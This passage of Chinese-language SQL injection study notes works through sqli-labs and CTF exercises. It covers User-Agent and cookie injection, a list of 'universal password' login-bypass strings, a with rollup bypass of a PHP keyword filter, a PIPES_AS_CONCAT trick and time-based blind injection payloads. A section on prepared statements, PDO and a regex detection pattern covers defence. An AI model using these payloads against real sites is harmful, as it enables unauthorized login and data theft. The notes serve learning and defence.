`-- w`把后面的都给注释了，所以就是修改了admin用户的密码为 aaaaaa

## 九、User-Agent 注入

  

---

我们访问 [http://127.0.0.1/sqli/Less-18/](http://127.0.0.1/sqli/Less-18/)，页面显示一个登陆框和我们的ip信息。

当我们输入正确的用户名和密码之后登陆之后，页面多显示了 浏览器的User-Agent。

![1716463750181-8ba3ff14-ad8b-4a15-b427-bf13090a9780.png](https://image.3001.net/images/20240705/1720189280_6688016039f87ebfbba0f.png!small)

  

抓包，修改其User-Agent如下图，测试是否存在user-agent注入![1716463068359-1bb542ad-53ae-4376-a7d2-79643ff3fabe.png](https://image.3001.net/images/20240705/1720189281_6688016118531ec814bd2.png!small)

页面报错，存在报错注入

![1716463690471-4a6f6815-fcab-4325-9fb2-1d0e05e954ff.png](https://image.3001.net/images/20240705/1720189282_6688016210897adeaeeff.png!small)

`' and extractvalue(1,concat(0x7e,database(),0x7e))and '1'='1 #`我们可以将 database()修改为任何的函数

可以看到，页面将当前的数据库显示出来了。

![1716463981311-e120f77b-51ec-458e-bc4a-fba1e441d69b.png](https://image.3001.net/images/20240705/1720189283_668801630b747f20edc6e.png!small)

## 十、Cookie 注入

### 原理

  

---

cookie注入的原理是：就是修改cookie的值进行注入

♦cookie注入其原理也和平时的注入一样，只不过注入参数换成了cookie

♦要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。

### 条件

  

---

两个必须条件：

- 程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。
    
- 在条件1的基础上还需要程序对提交数据获取方式是直接`request("xxx")`的方式，**未指明**使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数**可以是在URL后面的参数**，**也可以是cookie里面的参数这里没有做筛选**，之后的原理就像我们的sql注入一样了。
    

## 十一、万能密码

### 原理

  

---

原验证登陆语句:

SELECT * FROM admin WHERE Username= '".$username."' AND Password= '".md5($password)."'

输入`1' or 1=1 or '1'='1`万能密码语句变为:

SELECT * FROM admin WHERE Username='1' OR 1=1 OR '1'='1' AND Password='EDFKGMZDFSDFDSFRRQWERRFGGG'

即得到优先级关系：`or<and<not`，同一优先级默认从左往右计算。

- 上面`'1'='1' AND Password='EDFKGMZDFSDFDSFRRQWERRFGGG'`**先计算**肯定返回`false`,因为密码是我们乱输入的。(此处是假)
    
- Username=‘1’ 返回假，数据库没有1这个用户名(此处是假)
    
- 1=1返回真(此处是真)
    

以上的结果是:`假 or 真 or假`返回`真`。验证通过。再比如：

select tel,pwd where tel='111' and pwd='123456'

我们把电话111看成一个变量，输入电话号码为`' or 1= '1`。

sql就变为如下样子：

select  tel,pwd where tel='' or 1='1' and pwd='123456'

- 上面`1='1' and pwd='123456'`**先计算**肯定返回`false`。(此处是假)
    
- tel=‘’ 返回假，数据库没有`''`这个手机号。(此处是假)
    

以上的结果是:`真 or假`返回`真`。验证通过。

### 常用的万能密码

  

---

' or 1='1  
'or'='or'  
admin  
admin'--  
admin' or 4=4--  
admin' or '1'='1'--  
admin888  
"or "a"="a  
admin' or 2=2#  
a' having 1=1#  
a' having 1=1--  
admin' or '2'='2  
')or('a'='a  
or 4=4--  
c  
a'or' 4=4--  
"or 4=4--  
'or'a'='a  
"or"="a'='a  
'or''='  
'or'='or'  
1 or '1'='1'=1  
1 or '1'='1' or 4=4  
'OR 4=4%00  
"or 4=4%00  
'xor  
admin' UNION Select 1,1,1 FROM admin Where ''='  
1  
-1%cf' union select 1,1,1 as password,1,1,1 %23  
1  
17..admin' or 'a'='a 密码随便  
'or'='or'  
'or 4=4/*  
something  
' OR '1'='1  
1'or'1'='1  
admin' OR 4=4/*  
1'or'1'='1

# Sql 注入的预防

一般在项目中我们不太会去注意 SQL 注入的问题，因为我们会使用 ORM，而 ORM 在实现的过程中也会帮我做 SQL 注入过滤；但有的时候 ORM 没法满足我们的需求，这时可能就会手撸原生 SQL 来执行

### 预编译(PreparedStatement)(JSP)

  

---

可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。

String sql = "select id, no from user where id=?";  
PreparedStatement ps = conn.prepareStatement(sql);  
ps.setInt(1, id);  
ps.executeQuery();

如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？

其原因就是：采用了PreparedStatement预编译，就会将SQL语句："select id, no from user where id=?" 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该SQL语句的语法结构了，因为语法分析已经完成了，而语法分析主要是分析SQL命令，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面输入了这些SQL命令，也不会被当成SQL命令来执行了，因为这些SQL命令的执行， 必须先通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，只会被当做字符串字面值参数。所以SQL语句预编译可以有效防御SQL注入。

原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。

### PDO（PHP）

首先简单介绍一下什么是PDO。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。

PDO对于解决SQL注入的原理也是基于预编译。

$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );  
$data->bindParam( ':id', $id, PDO::PARAM_INT );  
$data->execute();

实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了占位符的方式，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以防止传那些危险变量改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行.

### 使用正则表达式过滤

正则表达式是一种用于匹配模式的工具，在检测 SQL 注入时非常有用。我们可以使用正则表达式来过滤和验证用户输入，以确保输入不包含任何恶意的 SQL 代码。下面是一些常见的正则表达式示例：

对用户输入的特殊字符进行严格过滤，如 '、"、<、>、/、*、;、+、-、&、|、(、)、and、or、select、union

pattern = re.compile(  
r"(%27)|(\')|(\-\-)|(%23)|(#)|"  # Regex for detection of SQL meta-characters  
r"\w*((%27)|(\'))\s+((%6F)|o|(%4F))((%72)|r|(%52))\s*|"  # Modified regex for detection of SQL meta-characters eg: ' or 1 = 1' detect word 'or',  
r"((%3D)|(=))[^\n]*((%27)|(\')|(\-\-)|(%3B)|(;))"  # Regex for typical SQL Injection attack eg: '= 1 --'  
r"((%27)|(\'))union|"  # Regex for detecting SQL Injection with the UNION keyword  
r"((%27)|(\'))select|"  # Regex for detecting SQL Injection with the UNION keyword  
r"((%27)|(\'))insert|"  # Regex for detecting SQL Injection with the UNION keyword  
r"((%27)|(\'))update|"  # Regex for detecting SQL Injection with the UNION keyword  
r"((%27)|(\'))drop",  # Regex for detecting SQL Injection with the UNION keyword  
re.IGNORECASE,  
)  
r = pattern.search("' OR 1 -- -")  
if r:  
return True

### 其他



# with rollup注入


```php
<?php  
       $flag="";  
        function replaceSpecialChar($strParam){  
             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";  
             return preg_replace($regex,"",$strParam);  
        }  
        if (!$con)  
        {  
            die('Could not connect: ' . mysqli_error());  
        }  
       if(strlen($username)!=strlen(replaceSpecialChar($username))){  
          die("sql inject error");  
       }  
       if(strlen($password)!=strlen(replaceSpecialChar($password))){  
          die("sql inject error");  
       }  
       $sql="select * from user where username = '$username'";  
       $result=mysqli_query($con,$sql);  
          if(mysqli_num_rows($result)>0){  
                while($row=mysqli_fetch_assoc($result)){  
                   if($password==$row['password']){  
                      echo "登陆成功<br>";  
                      echo $flag;  
                   }  
  
                 }  
          }  
    ?>
```



注意到它的password并不是直接从数据库取出，而是从第一次的查询结果表中用关联数组取 出的，这个结果表是张虚拟的查询时生成的表，并非真实的数据库中的表，所以我们可以想 办法在其中完成添加password的操作，下面先看一个mysql中的聚合函数with rollup:
![[Pasted image 20251008124448.png]]

![[Pasted image 20251008124507.png]]

![[Pasted image 20251008124523.png]]

那么我们只要用group by指定password字段即可在password字段生成一个Null，当然同时还 要加上' or 1才能查询到东西(虽然不会回显)
payload： 
'/\*\*/or/\*\*/1/\*\*/group/\*\*/by/\*\*/password/\*\*/with/\*\*/rollup#
这样总计行为
user：NULL passwd:NULL 这样用户名密码都为空就可以登录（有数字算和，字符串就原封不动）

eg：
## 原表

|city|country|
|---|---|
|LA|US|
|NYC|US|
|London|UK|
|Dalian|UK|

## 1️⃣ 执行 `GROUP BY country, city WITH ROLLUP`

1. **分组顺序**：`country` → `city`
    
2. **原始行保持不变**（先按 country，再按 city 分组）：
    

|country|city|
|---|---|
|US|LA|
|US|NYC|
|UK|London|
|UK|Dalian|

3. **生成 country 小计行**（city 被折叠为 NULL，country 保留）：
    

|country|city|
|---|---|
|US|NULL|
|UK|NULL|

4. **生成总计行**（country 也被折叠为 NULL）：
    

|country|city|
|---|---|
|NULL|NULL|

✅ 最终结果：

|country|city|
|---|---|
|US|LA|
|US|NYC|
|US|NULL|
|UK|London|
|UK|Dalian|
|UK|NULL|
|NULL|NULL|

> 注意：因为没有数值列，ROLLUP 的小计/总计行主要用于 **标记层级**，列值被折叠成 NULL，但不会计算聚合值。

---

## 2️⃣ 执行 `GROUP BY city, country WITH ROLLUP`

1. **分组顺序**：`city` → `country`
    
2. **原始行保持不变**（先按 city，再按 country 分组）：
    

|city|country|
|---|---|
|LA|US|
|NYC|US|
|London|UK|
|Dalian|UK|

3. **生成 city 小计行**（country 被折叠为 NULL，city 保留）：
    

|city|country|
|---|---|
|LA|NULL|
|NYC|NULL|
|London|NULL|
|Dalian|NULL|

4. **生成总计行**（city 也被折叠为 NULL）：
    

|city|country|
|---|---|
|NULL|NULL|

✅ 最终结果：

|city|country|
|---|---|
|LA|US|
|NYC|US|
|London|UK|
|Dalian|UK|
|LA|NULL|
|NYC|NULL|
|London|NULL|
|Dalian|NULL|
|NULL|NULL|
## 3️⃣ 核心对比

|分组方式|小计行折叠哪一列|总计行折叠哪一列|
|---|---|---|
|`country, city`|city → NULL|country, city → NULL|
|`city, country`|country → NULL|city, country → NULL|

> ✅ 小结：
> 
> - **ROLLUP 总是从右向左折叠列**
>     
> - 没有数值列时，折叠行只是标记层级，列值为 NULL
>     
> - 有数值列时，会对折叠列的行进行聚合计算（SUM、COUNT 等）



# 无select的查询语句

```
SHOW TABLES;
SHOW DATABASES;
DESCRIBE users;
EXPLAIN SELECT * FROM users;
SHOW CREATE TABLE users;
SHOW COLUMNS FROM users;

```
后续内容及其绕过姿势看buuctf的 
 [强网杯 2019]随便注

# 带||的sql查询语句
```
$sql = "select ".$post['query']."||flag from Flag"; 
```
在mysql中，||表示的逻辑运算or
会返回1（true）或者0（false）


## 方法一：使用 sql_mode 中的 PIPES_AS_CONCAT 函数。
**PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。**

**select 1 || flag from Flag的意思将变成 先查询1 再查询 flag，而不是查询1flag,只是查询的结果会拼接到一起，不要弄混淆了。**

**所以查询语句如下：**

```
1;SET SESSION sql_mode=PIPES_AS_CONCAT;select 1

//这个set session不知道加不加，gpt说加
```

##  方法二：

payload=\*，1
\$sql = select  \*,1||flag from Flag; 
后面逻辑判断为真输出flag前面select 1


# 时间盲注
首先判断注入点，看看是否能注，看是用什么闭合判断注入方式
`1'and if(1>2,1,sleep(5))#`
睡了5秒，那基本就是时间盲注
```
if（判断语句，x，y）如果判断语句正确则输出X，否则输出Y
sleep(X)函数，延迟X秒后回显
if(1=1,1,sleep(1))即输出一
if(1=2,1,sleep(1))即延迟一秒后回显

```
当确定有时间盲注后
## 判断库名长度
```
?id=1' and if(length(database())>8,sleep(2),0) --+

```

## 判断库名
```
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+
此为判断第一个字母的ascii码是否为115
或者用二分法
?id=1' and if(ascii(substr(database(),1,1))>115,sleep(2),0) --+



再判断第二个
?id=1' and if(ascii(substr(database(),2,1))=115,sleep(2),0) --+

```
# 判断表名
详情仿照布尔盲注





# 双写绕过